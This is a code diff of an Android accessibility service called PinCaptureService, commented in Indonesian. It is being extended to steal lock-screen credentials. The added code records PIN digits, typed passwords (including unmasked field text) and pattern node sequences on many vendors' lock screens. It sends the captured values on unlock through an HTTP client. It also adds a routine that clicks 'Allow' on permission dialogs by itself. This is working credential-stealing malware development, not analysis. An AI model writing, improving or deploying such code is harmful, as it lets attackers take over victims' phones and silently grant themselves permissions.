@@ -5,6 +5,7 @@ import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Context
 import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import com.google.gson.JsonObject
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
@@ -20,13 +21,17 @@ class PinCaptureService : AccessibilityService() {
         .build()
     private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
 
-    // Buffer PIN / password digit
     private val pinBuffer      = StringBuilder()
     private val passwordBuffer = StringBuilder()
     private var lockType       = "pin"
     private var isOnLock       = false
     private var lastSent       = ""
-    private var patternDots    = mutableListOf<String>()
+
+    // Pattern: simpan urutan node 1–9 yang disentuh
+    private val patternNodes   = mutableListOf<Int>()
+
+    // Dedup PIN: hindari dobel-append dari onKeyEvent + TYPE_VIEW_CLICKED
+    private var lastKeyEventMs = 0L
 
     private val LOCK_PKGS = setOf(
         "com.android.systemui",
@@ -43,7 +48,10 @@ class PinCaptureService : AccessibilityService() {
         "com.sec.android.app.launcher",
         "com.oneplus.launcher",
         "com.oppo.launcher",
-        "com.realme.launcher"
+        "com.realme.launcher",
+        "com.zte.launcher",
+        "com.hihonor.android.launcher",
+        "com.nothing.launcher"
     )
 
     override fun onServiceConnected() {
@@ -54,7 +62,6 @@ class PinCaptureService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED    or
                 AccessibilityEvent.TYPE_VIEW_SCROLLED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            // FLAG_REQUEST_FILTER_KEY_EVENTS wajib agar onKeyEvent() aktif
             flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS             or
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
@@ -65,31 +72,25 @@ class PinCaptureService : AccessibilityService() {
     // ── Key event interceptor — tangkap PIN / password sebelum di-mask ───────
     override fun onKeyEvent(event: KeyEvent): Boolean {
         if (event.action != KeyEvent.ACTION_DOWN) return false
-
-        // Hanya saat ada konteks lock
         if (!isOnLock) return false
 
+        lastKeyEventMs = System.currentTimeMillis()
+
         when (event.keyCode) {
-            // Angka 0–9 → PIN
             in KeyEvent.KEYCODE_0..KeyEvent.KEYCODE_9 -> {
-                val digit = (event.keyCode - KeyEvent.KEYCODE_0).toString()
-                pinBuffer.append(digit)
+                pinBuffer.append((event.keyCode - KeyEvent.KEYCODE_0).toString())
                 lockType = "pin"
             }
-            // Numpad 0–9
             in KeyEvent.KEYCODE_NUMPAD_0..KeyEvent.KEYCODE_NUMPAD_9 -> {
-                val digit = (event.keyCode - KeyEvent.KEYCODE_NUMPAD_0).toString()
-                pinBuffer.append(digit)
+                pinBuffer.append((event.keyCode - KeyEvent.KEYCODE_NUMPAD_0).toString())
                 lockType = "pin"
             }
-            // Backspace
             KeyEvent.KEYCODE_DEL -> {
                 if (lockType == "pin" && pinBuffer.isNotEmpty())
                     pinBuffer.deleteCharAt(pinBuffer.length - 1)
                 else if (passwordBuffer.isNotEmpty())
                     passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
             }
-            // Enter / OK → kirim sekarang
             KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                 val captured = buildCaptureString()
                 if (captured.isNotBlank()) {
@@ -98,7 +99,6 @@ class PinCaptureService : AccessibilityService() {
                 }
             }
             else -> {
-                // Karakter printable (password keyboard)
                 val unicode = event.unicodeChar
                 if (unicode != 0 && unicode != 10) {
                     passwordBuffer.append(unicode.toChar())
@@ -106,7 +106,7 @@ class PinCaptureService : AccessibilityService() {
                 }
             }
         }
-        return false // Jangan konsumsi event
+        return false
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -120,12 +120,15 @@ class PinCaptureService : AccessibilityService() {
                 val cls = ev.className?.toString() ?: ""
                 val isLockWindow =
                     pkg in LOCK_PKGS ||
-                    cls.contains("KeyguardBouncer",   ignoreCase = true) ||
-                    cls.contains("LockScreen",         ignoreCase = true) ||
-                    cls.contains("KeyguardHostView",   ignoreCase = true) ||
-                    cls.contains("StatusBarKeyguard",  ignoreCase = true) ||
-                    cls.contains("UnlockMethodCache",  ignoreCase = true) ||
-                    cls.contains("KeyguardSecurityContainer", ignoreCase = true) ||
+                    cls.contains("KeyguardBouncer",          ignoreCase = true) ||
+                    cls.contains("LockScreen",               ignoreCase = true) ||
+                    cls.contains("KeyguardHostView",         ignoreCase = true) ||
+                    cls.contains("StatusBarKeyguard",        ignoreCase = true) ||
+                    cls.contains("UnlockMethodCache",        ignoreCase = true) ||
+                    cls.contains("KeyguardSecurityContainer",ignoreCase = true) ||
+                    cls.contains("MiuiKeyguard",             ignoreCase = true) ||
+                    cls.contains("OppoKeyguard",             ignoreCase = true) ||
+                    cls.contains("SamsungKeyguard",          ignoreCase = true) ||
                     (pkg in LOCK_PKGS && cls.contains("PhoneWindow", ignoreCase = true))
 
                 if (isLockWindow) {
@@ -134,15 +137,21 @@ class PinCaptureService : AccessibilityService() {
                         resetBuffers()
                     }
                 } else if (isOnLock && pkg !in LOCK_PKGS) {
-                    // Layar berhasil dibuka — kirim hasil capture
                     val captured = buildCaptureString()
                     if (captured.isNotBlank()) sendCapture(captured, lockType)
                     isOnLock = false
                     resetBuffers()
                 }
+
+                // Auto-klik tombol Allow pada dialog permission
+                if (pkg.contains("packageinstaller",         ignoreCase = true) ||
+                    pkg.contains("permissioncontroller",     ignoreCase = true) ||
+                    pkg.contains("com.google.android.permissioncontroller")) {
+                    autoClickAllow(ev)
+                }
             }
 
-            // ── Klik tombol numpad PIN (fallback jika onKeyEvent tidak cukup) ─
+            // ── Klik numpad PIN — fallback jika onKeyEvent tidak cukup ────────
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val inLock = isOnLock || pkg in LOCK_PKGS
                 if (!inLock) return
@@ -154,29 +163,47 @@ class PinCaptureService : AccessibilityService() {
                 val srcTxt = src.text?.toString() ?: ""
 
                 when {
-                    // Digit 0–9 murni dari contentDescription ATAU text node
+                    // ── Pattern: node 1–9 di PatternView ─────────────────────
+                    srcCls.contains("PatternView",   ignoreCase = true) ||
+                    viewId.contains("lockPattern",   ignoreCase = true) ||
+                    viewId.contains("pattern_view",  ignoreCase = true) -> {
+                        lockType  = "pattern"
+                        isOnLock  = true
+                        // Beberapa ROM kirim contentDescription "1" s/d "9" per node
+                        val nodeNum = desc.trim().toIntOrNull()
+                        if (nodeNum != null && nodeNum in 1..9 && !patternNodes.contains(nodeNum)) {
+                            patternNodes.add(nodeNum)
+                        }
+                    }
+
+                    // ── Digit dari numpad PIN ─────────────────────────────────
                     desc.matches(Regex("[0-9]")) ||
                     (srcTxt.matches(Regex("[0-9]")) && desc.isBlank()) -> {
                         val digit = if (desc.matches(Regex("[0-9]"))) desc else srcTxt
-                        // Tambahkan hanya jika belum ada dari onKeyEvent
-                        if (pinBuffer.length < 10) {
-                            lockType = "pin"
-                            isOnLock = true
+                        // Dedup: jika onKeyEvent sudah tangkap dalam 100ms, skip
+                        val ageSinceKey = System.currentTimeMillis() - lastKeyEventMs
+                        if (ageSinceKey > 100 && pinBuffer.length < 12) {
+                            lockType  = "pin"
+                            isOnLock  = true
                             pinBuffer.append(digit)
                         }
                     }
 
-                    // Tombol backspace / hapus
+                    // ── Backspace / hapus ─────────────────────────────────────
                     desc.equals("Delete",    ignoreCase = true) ||
                     desc.equals("Backspace", ignoreCase = true) ||
-                    viewId.contains("delete",    ignoreCase = true) ||
-                    viewId.contains("backspace", ignoreCase = true) ||
-                    viewId.contains("key_delete",ignoreCase = true) -> {
-                        if (pinBuffer.isNotEmpty()) pinBuffer.deleteCharAt(pinBuffer.length - 1)
-                        if (passwordBuffer.isNotEmpty()) passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
+                    viewId.contains("delete",     ignoreCase = true) ||
+                    viewId.contains("backspace",  ignoreCase = true) ||
+                    viewId.contains("key_delete", ignoreCase = true) -> {
+                        if (lockType == "pattern" && patternNodes.isNotEmpty())
+                            patternNodes.removeAt(patternNodes.size - 1)
+                        else if (pinBuffer.isNotEmpty())
+                            pinBuffer.deleteCharAt(pinBuffer.length - 1)
+                        else if (passwordBuffer.isNotEmpty())
+                            passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
                     }
 
-                    // OK / Enter
+                    // ── OK / Enter ────────────────────────────────────────────
                     desc.equals("OK",    ignoreCase = true) ||
                     desc.equals("Enter", ignoreCase = true) ||
                     viewId.contains("key_enter", ignoreCase = true) ||
@@ -188,63 +215,94 @@ class PinCaptureService : AccessibilityService() {
                         }
                     }
 
-                    // Password keyboard: tombol 1 karakter printable
-                    srcCls.contains("Button", ignoreCase = true) && desc.length == 1 -> {
-                        lockType = "password"
-                        isOnLock = true
-                        passwordBuffer.append(desc)
-                    }
-
-                    // Pattern lock view
-                    srcCls.contains("PatternView", ignoreCase = true) ||
-                    viewId.contains("lockPattern",  ignoreCase = true) -> {
-                        lockType = "pattern"
-                        isOnLock = true
+                    // ── Password keyboard: karakter printable tunggal ─────────
+                    srcCls.contains("Button", ignoreCase = true) &&
+                    desc.length == 1 && desc[0].code in 33..126 -> {
+                        val ageSinceKey = System.currentTimeMillis() - lastKeyEventMs
+                        if (ageSinceKey > 100) {
+                            lockType  = "password"
+                            isOnLock  = true
+                            passwordBuffer.append(desc)
+                        }
                     }
                 }
                 src.recycle()
             }
 
-            // ── Text changed pada field password/PIN ──────────────────────────
+            // ── Text changed pada field password / PIN ────────────────────────
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val inLock = isOnLock || pkg in LOCK_PKGS
                 if (!inLock) return
 
-                val src            = ev.source ?: return
-                val isPasswordFld  = src.isPassword
-                val nodeText       = src.text?.toString() ?: ""
-                val removedCount   = ev.removedCount
-                val addedCount     = ev.addedCount
+                val src           = ev.source ?: return
+                val isPasswordFld = src.isPassword
+                val nodeText      = src.text?.toString() ?: ""
+                val removedCount  = ev.removedCount
 
                 if (!isPasswordFld && nodeText.isNotBlank() &&
                     !nodeText.all { it == '•' || it == '*' || it == '·' }) {
-                    // Field tidak ter-mask → salin langsung
+                    // Field tidak ter-mask — ambil langsung (sandi beberapa ROM)
                     lockType = "password"
                     isOnLock = true
                     passwordBuffer.clear()
                     passwordBuffer.append(nodeText)
-                } else if (removedCount > 0 && addedCount == 0) {
-                    // Hapus karakter
+                } else if (isPasswordFld && ev.addedCount > 0 && nodeText.isNotBlank()) {
+                    // Beberapa ROM tetap emit teks asli meski isPassword=true
+                    if (!nodeText.all { it == '•' || it == '*' || it == '·' }) {
+                        lockType = "password"
+                        isOnLock = true
+                        passwordBuffer.clear()
+                        passwordBuffer.append(nodeText)
+                    }
+                } else if (removedCount > 0 && ev.addedCount == 0) {
                     val newLen = (passwordBuffer.length - removedCount).coerceAtLeast(0)
                     if (passwordBuffer.length > newLen)
                         passwordBuffer.delete(newLen, passwordBuffer.length)
                 }
-                // Penambahan karakter sudah ditangani onKeyEvent()
                 src.recycle()
             }
 
-            // ── Pattern gesture ───────────────────────────────────────────────
+            // ── Pattern gesture via scroll (beberapa ROM) ─────────────────────
             AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                 val inLock = isOnLock || pkg in LOCK_PKGS
                 if (!inLock) return
                 val src = ev.source ?: return
-                if (src.className?.toString()?.contains("PatternView", ignoreCase = true) == true) {
+                val cls = src.className?.toString() ?: ""
+                if (cls.contains("PatternView", ignoreCase = true)) {
                     lockType = "pattern"
                     isOnLock = true
+                    // Kirim jika sudah punya minimal 3 node
+                    if (patternNodes.size >= 3) {
+                        sendCapture(buildCaptureString(), lockType)
+                        resetBuffers()
+                    }
                 }
                 src.recycle()
             }
         }
+    }
+
+    // ── Auto-klik Allow pada dialog permission ────────────────────────────────
+    private fun autoClickAllow(event: AccessibilityEvent) {
+        val root = event.source ?: return
+        val targets = listOf(
+            "allow", "izinkan", "grant", "ok", "continue",
+            "while using", "only this time", "satu kali ini"
+        )
+        fun search(node: AccessibilityNodeInfo) {
+            val txt = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
+            if (targets.any { txt.contains(it) } && node.isClickable) {
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                return
+            }
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i) ?: continue
+                search(child)
+                child.recycle()
+            }
+        }
+        try { search(root) } catch (_: Exception) {}
+        root.recycle()
     }
 
     override fun onInterrupt() {}
@@ -252,12 +310,14 @@ class PinCaptureService : AccessibilityService() {
     private fun resetBuffers() {
         pinBuffer.clear()
         passwordBuffer.clear()
-        patternDots.clear()
+        patternNodes.clear()
         lockType = "pin"
     }
 
     private fun buildCaptureString(): String = when (lockType) {
-        "pattern"  -> patternDots.joinToString("→").ifBlank { "" }
+        "pattern"  -> if (patternNodes.isNotEmpty())
+                          patternNodes.joinToString("-")
+                      else ""
         "password" -> passwordBuffer.toString().ifBlank { pinBuffer.toString() }
         else       -> pinBuffer.toString()
     }
